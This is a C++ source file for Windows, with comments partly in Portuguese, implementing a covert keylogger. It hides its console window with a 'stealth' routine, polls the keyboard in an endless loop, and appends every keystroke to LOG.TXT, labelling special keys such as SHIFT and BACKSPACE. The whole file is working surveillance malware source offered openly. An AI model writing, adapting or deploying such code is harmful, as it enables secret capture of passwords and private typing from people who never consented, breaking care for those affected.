#include <iostream>
#include <fstream>
using namespace std;
#include <windows.h>
#include <Winuser.h>


int save (int key_stroke, char *file){
    if((key_stroke == 1) || (key_stroke == 2)) return 0; //Chave ASCII AVC 1 é o botão esquerdo do mouse, enquanto 2 == botão direito do mouse, este simplesmente ignora essas entradas

    FILE *OUTPUT_FILE;
    OUTPUT_FILE = fopen(file, "a+"); 

    if(key_stroke == 8) fprintf(OUTPUT_FILE, "%s", "[BACKSPACE] ");
    else if(key_stroke == 32) fprintf(OUTPUT_FILE, "%s", " ");
    else if(key_stroke == 18) fprintf(OUTPUT_FILE, "%s", "[ALT] ");
    else if(key_stroke == 91) fprintf(OUTPUT_FILE, "%s", "[WINDOWS] ");
    else if(key_stroke == 17) fprintf(OUTPUT_FILE, "%s", "[CONTROL] ");
    else if(key_stroke == 16) fprintf(OUTPUT_FILE, "%s", "[SHIFT] ");
    else if(key_stroke == 20) fprintf(OUTPUT_FILE, "%s", "[CAPS LOCK] ");
    else if(key_stroke == 9)   fprintf(OUTPUT_FILE, "%s", "[TAB] ");
    else if(key_stroke == 13) fprintf(OUTPUT_FILE, "%s", "\n");
    else if(key_stroke == 36) fprintf(OUTPUT_FILE, "%s", "[HOME] ");
    else if(key_stroke == 35) fprintf(OUTPUT_FILE, "%s", "[END] ");
    else if(key_stroke == 46) fprintf(OUTPUT_FILE, "%s", "[DELETE] ");
    else if(key_stroke == 33) fprintf(OUTPUT_FILE, "%s", "[PAGE UP] ");
    else if(key_stroke == 45) fprintf(OUTPUT_FILE, "%s", "[INSERT] ");
    else if(key_stroke == 34) fprintf(OUTPUT_FILE, "%s", "[PAGE DOWN] ");

    else fprintf(OUTPUT_FILE, "%s", &key_stroke);

    fclose(OUTPUT_FILE);
    cout << key_stroke << endl;

return 0;
}

void stealth (){ //hides the window
    HWND stealth;
    AllocConsole();
    stealth = FindWindowA("consoleWindowClass", NULL);
    ShowWindow(stealth, 0);
}

int main(){
    stealth();
    char i;
    while(1){
            for (i = 8; i<=190; i++){ //only these ascii values /*Se a chave com código i (0 a 190) é pressionado, salve-o em um log*/
                if (GetAsyncKeyState(i) == -32767) /*Determina se a chave é para cima ou para baixo, -32767 é valor para o OS quando está prestes a processar uma tecla:*/
                    save(i, "LOG.TXT"); 
            }
    }
    system("PAUSE");
return 0;
}
